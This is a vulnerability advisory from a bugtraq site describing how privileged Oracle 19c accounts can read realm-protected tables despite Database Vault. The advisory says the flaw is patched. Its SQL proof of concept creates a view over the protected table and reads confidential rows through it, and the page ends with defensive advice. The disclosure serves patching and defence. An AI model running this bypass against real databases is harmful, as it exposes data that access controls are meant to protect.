---
title: Oracle 19c Access Bypass
url: https://cxsecurity.com/issue/WLB-2023030018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-09
fetch_date: 2025-10-04T08:59:17.076165
---

# Oracle 19c Access Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle 19c Access Bypass** **2023.03.08**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Title: Oracle Database Vault Protected Table With Realm Data Extraction Vulnerability
Product: Database
Manufacturer: Oracle
Affected Version(s): 19c [19.18 and below]
Risk Level: Medium
Solution Status: Fixed in Oracle Critical Patch Update October 2022 [back-port patch for 21c version]
CVE Reference: N/A, Patch Backported in Oracle CPU OCT 2022...fixed in Oracle 21c release on-wards
Author of Advisory: Emad Al-Mousa
Overview:
Oracle Database Vault is a security feature that provides controls to prevent unauthorized privileged users from accessing sensitive data, prevent unauthorized database changes, and helps customers meet industry, regulatory, or corporate security standards.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
data extraction/exfiltration of a sensitive table that is protected with a security realm was possible by privileged account. The DB vault is designed to protect against privileged accounts being able to access confidential data !!
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
A sensitive table called “HR.sensitive\_table” in PDB1 under HR schema will be protected with REALM through the following steps:
sqlplus c##dbv\_owner\_root\_backup/dbv\_2020@PDB1
SQL> begin
DBMS\_MACADM.CREATE\_REALM (
realm\_name=> 'HR Access Protection',
description=> 'HR schema in PDB1',
enabled=> DBMS\_MACUTL.G\_YES,
audit\_options=> DBMS\_MACUTL.G\_REALM\_AUDIT\_FAIL,
realm\_type=> 1);
end;
/
SQL> begin
DBMS\_MACADM.ADD\_OBJECT\_TO\_REALM(
realm\_name=> 'HR Access Protection',
object\_owner=> 'HR',
object\_name=> 'sensitive\_table',
object\_type=> 'TABLE');
end;
/
SQL> begin
DBMS\_MACADM.ADD\_AUTH\_TO\_REALM(
realm\_name=> 'HR Access Protection',
grantee=> 'HR',
auth\_options=> DBMS\_MACUTL.G\_REALM\_AUTH\_OWNER);
end;
/
Now as SYS user I shouldn’t be able to view the data of table HR.sensitive\_table as expected…..However I was able to create a view under HR schema to “extract” the confidential data !
So, the exploit was basically executing the following two SQL statements (view creation of the protected realm table and then viewing the data from the view. The exploit required two system privileges: create any view, select any view)
SQL> create or replace view HR.DUMMY\_V as select \* from HR.sensitive\_table;
SQL> select \* from HR.DUMMY\_V;
Per documentation to revoke DDL authorization, you can use DBMS\_MACADM.UNAUTHORIZE\_DDL procedure:
https://docs.oracle.com/database/121/DVADM/release\_changes.htm#DVADM70086
based on that let us simulate:
ORACLE19c > sqlplus c##dbv\_owner\_root\_backup/XXXXXXX@PDB1
SQL> select \* from DBA\_DV\_DDL\_AUTH;
GRANTEE
——————————————————————————–
SCHEMA
——————————————————————————–
%
%
SQL> exec DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYS’,’HR’);
BEGIN DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYS’,’HR’); END;
\*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYS on schema
HR is not found.
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1678
ORA-06512: at line 1
SQL> EXEC DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYS’, ‘%’);
BEGIN DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYS’, ‘%’); END;
\*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYS on schema
% is not found.
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1678
ORA-06512: at line 1
Then, i tried to execute the same procedure for SYSTEM account:
SQL> EXEC DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYSTEM’, ‘%’);
BEGIN DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYSTEM’, ‘%’); END;
\*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYSTEM on
schema % is not found.
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1678
ORA-06512: at line 1
SQL> EXEC DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYSTEM’, ‘HR’);
BEGIN DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYSTEM’, ‘HR’); END;
\*
ERROR at line 1:
ORA-47974: Oracle DDL authorization for Oracle Database Vault to SYSTEM on
schema HR is not found.
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1435
ORA-06512: at “DVSYS.DBMS\_MACADM”, line 1678
ORA-06512: at line 1
For the sake of illustration, i granted SYSTEM account DDL authorization to see if the view is updated ( and view was updated successfully):
SQL> EXEC DBMS\_MACADM.AUTHORIZE\_DDL(‘SYSTEM’, ‘HR’);
PL/SQL procedure successfully completed.
SQL> select \* from DBA\_DV\_DDL\_AUTH;
GRANTEE
——————————————————————————–
SCHEMA
——————————————————————————–
%
%
SYSTEM
HR
After that i have removed the DDL authorization as shown below:
SQL> EXEC DBMS\_MACADM.UNAUTHORIZE\_DDL(‘SYSTEM’, ‘HR’);
PL/SQL procedure successfully completed.
SQL> select \* from DBA\_DV\_DDL\_AUTH;
GRANTEE SCHEMA
——————————————————————————————————————————– ——————————————————————————————————————————–
% %
This doesn’t make any difference as SYSTEM account as shown below will still be able to create the view even though DBMS\_MACADM.UNAUTHORIZE\_DDL was executed successfully:
ORACLE19c > sqlplus system/XXXXX@PDB1
SQL> select \* from HR.sensitive\_table;
select \* from HR.sensitive\_table
\*
ERROR at line 1:
ORA-01031: insufficient privileges
SQL> create or replace view HR.sensitive\_table3c as select \* from HR.sensitive\_table;
View created.
SQL> select \* from HR.sensitive\_table3c ;
FNAME LNAME EXECUTIVE\_COMPENSATION
———- ———- ——————————
MRIO BASIL 1200000
Thomas Raynold 1100000
Jessica Rodrigo 3200000
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
- Defensive Techniques:
configure security auditing.
ensure database accounts have strong passwords, and rotate passwords regularly if possible.
pro-actively patch your systems and database systems.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://datab...